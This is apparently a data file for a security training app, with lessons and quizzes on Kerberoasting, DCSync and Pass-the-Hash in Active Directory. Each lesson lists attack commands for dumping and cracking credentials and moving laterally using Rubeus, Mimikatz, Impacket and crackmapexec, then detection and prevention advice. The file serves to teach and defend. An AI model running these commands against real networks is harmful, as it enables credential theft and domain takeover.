// client/src/data/theory/index.js

/**
 * Theory modules for interactive learning
 * Each module provides educational content before scenarios
 */

export const theoryModules = {
  'kerberoasting': {
    id: 'kerberoasting',
    title: 'Kerberoasting Attack Fundamentals',
    subtitle: 'Master the art of extracting service account credentials',
    estimatedTime: '15 minutes',
    difficulty: 'Intermediate',
    xpReward: 150,
    
    sections: [
      {
        id: 'intro',
        title: '🎯 What is Kerberoasting?',
        type: 'intro',
        duration: '2 min',
        content: `Kerberoasting is a post-exploitation attack that targets service accounts in Active Directory. It's one of the most common and effective ways to escalate privileges in an AD environment.

**Why it matters:** Service accounts often have elevated privileges and weak passwords, making them prime targets for attackers.

**Real-world impact:** Used in 60%+ of AD compromises, including major ransomware attacks.`,
        
        keyPoints: [
          'Any authenticated domain user can request service tickets',
          'Service tickets are encrypted with the service account password',
          'Offline brute-force attack on encrypted tickets',
          'No special privileges required to perform the attack'
        ]
      },
      
      {
        id: 'kerberos-fundamentals',
        title: '🔐 Kerberos Authentication Overview',
        type: 'concept',
        duration: '3 min',
        content: `Kerberos is a network authentication protocol that uses tickets to authenticate users and services.

**Key Components:**
- **TGT (Ticket Granting Ticket)**: Proves user authentication
- **TGS (Ticket Granting Service)**: Issues service tickets
- **Service Ticket**: Encrypted with service account password hash

**The Vulnerability:**
Service tickets can be requested by any authenticated user, and they're encrypted with the service account's password hash. This means we can capture the ticket and crack it offline!`,
        
        example: {
          title: 'Kerberos Authentication Flow',
          code: `1. User authenticates → Receives TGT
2. User requests service access → DC issues TGS ticket
3. TGS encrypted with service account password
4. Attacker captures ticket → Cracks offline`
        }
      },
      
      {
        id: 'spn-explanation',
        title: '🎯 Service Principal Names (SPNs)',
        type: 'concept',
        duration: '3 min',
        content: `Service Principal Names (SPNs) are unique identifiers that link services to service accounts in Active Directory.

**Format:** ServiceClass/Host:Port
**Example:** MSSQLSvc/SQL01.contoso.local:1433`,
        
        example: {
          title: 'Finding SPNs',
          code: `# PowerShell
Get-ADUser -Filter {ServicePrincipalName -like "*"} -Properties ServicePrincipalName

# PowerView
Get-DomainUser -SPN

# Impacket
GetUserSPNs.py contoso.local/user:password -dc-ip 10.0.1.10`
        },
        
        keyPoints: [
          'SPNs map services to accounts',
          'One account can have multiple SPNs',
          'Required for Kerberos authentication to services',
          'Easily enumerable by any domain user'
        ]
      },
      
      {
        id: 'attack-process',
        title: '⚔️ Attack Execution Steps',
        type: 'steps',
        duration: '5 min',
        content: 'Follow these steps to perform a Kerberoasting attack:',
        
        steps: [
          {
            number: 1,
            title: 'Enumerate SPNs',
            description: 'Find all service accounts with registered SPNs',
            commands: [
              'Get-DomainUser -SPN | Select SamAccountName,ServicePrincipalName',
              'GetUserSPNs.py contoso.local/user:password -dc-ip 10.0.1.10'
            ]
          },
          {
            number: 2,
            title: 'Request Service Tickets',
            description: 'Request TGS tickets for discovered SPNs',
            commands: [
              'Rubeus.exe kerberoast /format:hashcat /outfile:hashes.txt',
              'GetUserSPNs.py contoso.local/user:password -dc-ip 10.0.1.10 -request'
            ]
          },
          {
            number: 3,
            title: 'Extract Tickets',
            description: 'Export the encrypted service tickets',
            commands: [
              'Invoke-Mimikatz -Command "kerberos::list /export"',
              'klist (to view cached tickets)'
            ]
          },
          {
            number: 4,
            title: 'Crack Offline',
            description: 'Use hashcat or john to crack the password',
            commands: [
              'hashcat -m 13100 -a 0 hashes.txt rockyou.txt',
              'john --format=krb5tgs hashes.txt'
            ]
          }
        ]
      },
      
      {
        id: 'defense',
        title: '🛡️ Detection & Prevention',
        type: 'defensive',
        duration: '3 min',
        content: 'Understanding defensive measures is crucial for security professionals.',
        
        detection: {
          logs: [
            'Event ID 4769: Kerberos service ticket requested',
            'Look for multiple 4769 events from single user',
            'Monitor for RC4 encryption usage (should be rare)'
          ],
          indicators: [
            'Multiple service ticket requests in short time',
            'Service ticket requests for high-value SPNs',
            'Unusual RC4 encryption in ticket requests'
          ]
        },
        
        prevention: [
          {
            title: 'Strong Service Account Passwords',
            description: 'Use passwords >25 characters for service accounts',
            example: 'Implement password manager for complex passwords'
          },
          {
            title: 'Group Managed Service Accounts (gMSA)',
            description: 'Use gMSA with 128-character auto-rotating passwords',
            example: 'New-ADServiceAccount -Name gMSA_SQL01'
          },
          {
            title: 'Disable RC4 Encryption',
            description: 'Force AES-256 encryption via Group Policy',
            example: 'Network security: Configure encryption types allowed for Kerberos'
          },
          {
            title: 'Least Privilege',
            description: 'Remove unnecessary admin rights from service accounts',
            example: 'Regular audit of service account permissions'
          }
        ]
      }
    ],
    
    quiz: [
      {
        question: 'What encryption is used for service tickets in Kerberoasting?',
        options: [
          'The service account\'s password hash',
          'The domain administrator\'s password',
          'The user\'s password hash',
          'A random session key'
        ],
        correct: 0,
        explanation: 'Service tickets (TGS) are encrypted with the hash of the service account\'s password, which allows offline cracking.'
      },
      {
        question: 'Which is the BEST defense against Kerberoasting?',
        options: [
          'Disable Kerberos authentication',
          'Use Group Managed Service Accounts (gMSA)',
          'Remove all SPNs from Active Directory',
          'Block port 88'
        ],
        correct: 1,
        explanation: 'gMSAs use 128-character auto-rotating passwords that are virtually impossible to crack.'
      },
      {
        question: 'What permissions are required to request service tickets?',
        options: [
          'Domain Admin',
          'Local Admin on target server',
          'Any authenticated domain user',
          'Service account permissions'
        ],
        correct: 2,
        explanation: 'Any authenticated domain user can request service tickets - no special privileges needed!'
      }
    ],
    
    resources: [
      {
        title: 'MITRE ATT&CK - Kerberoasting',
        url: 'https://attack.mitre.org/techniques/T1558/003/',
        type: 'reference'
      },
      {
        title: 'Rubeus Tool',
        url: 'https://github.com/GhostPack/Rubeus',
        type: 'tool'
      }
    ]
  },

  'dcsync': {
    id: 'dcsync',
    title: 'DCSync Attack Deep Dive',
    subtitle: 'Extract domain credentials like a Domain Controller',
    estimatedTime: '12 minutes',
    difficulty: 'Advanced',
    xpReward: 200,
    
    sections: [
      {
        id: 'intro',
        title: '🎯 What is DCSync?',
        type: 'intro',
        duration: '2 min',
        content: `DCSync is a powerful attack that allows an attacker to impersonate a Domain Controller and request password hashes for any user through the Directory Replication Service Remote Protocol (MS-DRSR).

**Critical Impact:** With DCSync, you can extract the krbtgt hash and create Golden Tickets for persistent domain admin access.`,
        
        keyPoints: [
          'Abuses legitimate AD replication protocol',
          'Extracts password hashes without touching LSASS',
          'Requires specific replication permissions',
          'Can extract krbtgt hash for Golden Ticket attacks'
        ]
      },
      
      {
        id: 'replication',
        title: '🔄 Active Directory Replication',
        type: 'concept',
        duration: '3 min',
        content: `Active Directory uses multi-master replication between Domain Controllers. DCSync exploits this legitimate mechanism.

**Normal Replication:** DCs replicate changes using the Directory Replication Service (DRS), including password hashes.

**The Attack:** An attacker with replication permissions can pretend to be a DC and request any object's data.`,
        
        example: {
          title: 'Required Permissions',
          code: `DS-Replication-Get-Changes (GUID: 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2)
DS-Replication-Get-Changes-All (GUID: 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2)

Default holders:
- Domain Admins
- Enterprise Admins
- Administrators
- Domain Controllers`
        }
      },
      
      {
        id: 'attack-steps',
        title: '⚔️ Executing DCSync',
        type: 'steps',
        duration: '4 min',
        content: 'Steps to perform a DCSync attack:',
        
        steps: [
          {
            number: 1,
            title: 'Verify Permissions',
            description: 'Check if compromised account has replication rights',
            commands: [
              'Get-DomainObjectAcl -SearchBase "DC=contoso,DC=local" -ResolveGUIDs'
            ]
          },
          {
            number: 2,
            title: 'Execute DCSync',
            description: 'Use Mimikatz or Impacket to perform replication',
            commands: [
              'mimikatz # lsadump::dcsync /domain:contoso.local /user:Administrator',
              'secretsdump.py contoso.local/user:password@dc01.contoso.local'
            ]
          },
          {
            number: 3,
            title: 'Extract Hashes',
            description: 'Receive NTLM and Kerberos hashes',
            commands: [
              'Use hashes for Pass-the-Hash attacks',
              'Create Golden Tickets with krbtgt hash'
            ]
          }
        ]
      },
      
      {
        id: 'defense',
        title: '🛡️ Detection & Mitigation',
        type: 'defensive',
        duration: '3 min',
        content: 'Detecting and preventing DCSync attacks.',
        
        detection: {
          logs: [
            'Event ID 4662: An operation was performed on an object',
            'Directory Service Access auditing must be enabled',
            'Monitor replication requests from non-DC computers'
          ],
          indicators: [
            'Event 4662 with Replication-Get-Changes GUIDs',
            'Replication requests from workstations',
            'Unusual accounts performing replication'
          ]
        },
        
        prevention: [
          {
            title: 'Limit Replication Permissions',
            description: 'Regularly audit who has replication rights',
            example: 'Remove unnecessary accounts from privileged groups'
          },
          {
            title: 'Protected Users Group',
            description: 'Add high-value accounts to Protected Users',
            example: 'Prevents NTLM hash replication for these users'
          },
          {
            title: 'Enable Advanced Auditing',
            description: 'Configure Directory Service Access auditing',
            example: 'auditpol /set /subcategory:"Directory Service Access" /success:enable'
          }
        ]
      }
    ],
    
    quiz: [
      {
        question: 'What protocol does DCSync abuse?',
        options: [
          'LDAP',
          'MS-DRSR (Directory Replication Service)',
          'SMB',
          'RPC'
        ],
        correct: 1,
        explanation: 'DCSync abuses the MS-DRSR protocol used for legitimate replication between Domain Controllers.'
      },
      {
        question: 'Which permission is NOT required for DCSync?',
        options: [
          'DS-Replication-Get-Changes',
          'DS-Replication-Get-Changes-All',
          'GenericAll on domain object',
          'Local Administrator on the DC'
        ],
        correct: 3,
        explanation: 'DCSync does not require local admin access to the DC, only the replication permissions.'
      }
    ],
    
    resources: [
      {
        title: 'MITRE ATT&CK - DCSync',
        url: 'https://attack.mitre.org/techniques/T1003/006/',
        type: 'reference'
      }
    ]
  },

  'pass-the-hash': {
    id: 'pass-the-hash',
    title: 'Pass-the-Hash Attack',
    subtitle: 'Authenticate without knowing the plaintext password',
    estimatedTime: '10 minutes',
    difficulty: 'Intermediate',
    xpReward: 120,
    
    sections: [
      {
        id: 'intro',
        title: '🎯 What is Pass-the-Hash?',
        type: 'intro',
        duration: '2 min',
        content: `Pass-the-Hash (PtH) is an attack where an attacker uses a password hash (usually NTLM) instead of the plaintext password to authenticate to remote systems.

**Key Insight:** Windows authentication protocols like NTLM don't require the plaintext password - the hash is sufficient!`,
        
        keyPoints: [
          'Uses password hash instead of plaintext password',
          'Works with NTLM authentication',
          'No need to crack the hash',
          'Common lateral movement technique'
        ]
      },
      
      {
        id: 'how-it-works',
        title: '🔐 How NTLM Authentication Works',
        type: 'concept',
        duration: '3 min',
        content: `NTLM authentication uses a challenge-response mechanism where the password hash (not plaintext) is used for authentication.

**The Vulnerability:** If you have the hash, you can authenticate without ever knowing the actual password.`,
        
        example: {
          title: 'NTLM Hash Format',
          code: `Username:RID:LM Hash:NTLM Hash
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0

The second hash (NTLM) is what we need for PtH attacks.`
        }
      },
      
      {
        id: 'attack-steps',
        title: '⚔️ Executing Pass-the-Hash',
        type: 'steps',
        duration: '3 min',
        
        steps: [
          {
            number: 1,
            title: 'Obtain Password Hash',
            description: 'Extract NTLM hash from compromised system',
            commands: [
              'mimikatz # sekurlsa::logonpasswords',
              'secretsdump.py user:password@target'
            ]
          },
          {
            number: 2,
            title: 'Use Hash for Authentication',
            description: 'Authenticate to remote systems using the hash',
            commands: [
              'mimikatz # sekurlsa::pth /user:admin /domain:contoso /ntlm:hash /run:cmd',
              'pth-winexe -U admin%hash //10.0.1.10 cmd'
            ]
          },
          {
            number: 3,
            title: 'Lateral Movement',
            description: 'Move to other systems using the compromised account',
            commands: [
              'crackmapexec smb 10.0.1.0/24 -u admin -H hash',
              'psexec.py -hashes :hash admin@10.0.1.10'
            ]
          }
        ]
      },
      
      {
        id: 'defense',
        title: '🛡️ Mitigation Strategies',
        type: 'defensive',
        duration: '2 min',
        
        prevention: [
          {
            title: 'Disable NTLM',
            description: 'Force Kerberos-only authentication',
            example: 'Network security: Restrict NTLM: Incoming NTLM traffic'
          },
          {
            title: 'Protected Users Group',
            description: 'Prevents NTLM for member accounts',
            example: 'Add privileged accounts to Protected Users'
          },
          {
            title: 'Credential Guard',
            description: 'Protects credentials using virtualization security',
            example: 'Enable on Windows 10/Server 2016+'
          }
        ]
      }
    ],
    
    quiz: [
      {
        question: 'What is required to perform Pass-the-Hash?',
        options: [
          'The plaintext password',
          'The NTLM hash',
          'A Kerberos ticket',
          'Domain Admin privileges'
        ],
        correct: 1,
        explanation: 'Pass-the-Hash only requires the NTLM hash, not the plaintext password.'
      }
    ],
    
    resources: [
      {
        title: 'MITRE ATT&CK - Pass the Hash',
        url: 'https://attack.mitre.org/techniques/T1550/002/',
        type: 'reference'
      }
    ]
  }
};

/**
 * Get theory module by scenario ID
 */
export const getTheoryModule = (scenarioId) => {
  return theoryModules[scenarioId] || null;
};

/**
 * Check if scenario has theory module
 */
export const hasTheoryModule = (scenarioId) => {
  return scenarioId in theoryModules;
};

/**
 * Get all theory modules
 */
export const getAllTheoryModules = () => {
  return Object.values(theoryModules);
};

/**
 * Get theory modules by difficulty
 */
export const getTheoryModulesByDifficulty = (difficulty) => {
  return Object.values(theoryModules).filter(module => module.difficulty === difficulty);
};
